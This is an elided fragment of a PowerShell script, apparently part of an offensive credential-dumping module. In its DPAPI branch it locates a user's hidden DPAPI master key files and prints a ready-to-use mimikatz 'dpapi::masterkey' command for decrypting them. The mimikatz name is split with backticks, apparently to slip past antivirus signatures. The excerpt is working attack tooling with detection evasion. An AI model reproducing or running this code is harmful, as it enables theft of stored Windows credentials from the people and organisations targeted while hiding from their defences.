...
If($Action -iMatch '^(DPAPI)$')
{
   ...
   .OUTPUTS
      ...
      [mimi`katz] dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<SID>\<MASTER_KEY_GUID>" /rpc
      [vault] 02:40:21 - module finished dumping secrets ..
   #>
   ...
   If($Dpapi1 -ne $null -or $Dpapi2 -ne $null)
   {
      ...
      write-host "        USER master keys" -ForegroundColor Green
      ...
      $GUID = (Gci -Path "$MasterKeySSID" -Attributes Hidden -Force -EA SilentlyContinue|?{$_.Name -NotMatch 'Preferred'}).Name
      ...
      If($i -lt 1)
      {
         ...
         write-host "]::" -NoNewline
         write-host "Fail to find any credential blobs [GUID] on path.`n"
      }
      Else
      {
         write-host "`n[mim`ikat`z] dpapi::masterkey /in:`"%appdata%\Microsoft\Protect\<SID>\<MASTER_KEY_GUID>`" /rpc" -ForegroundColor Red
      }
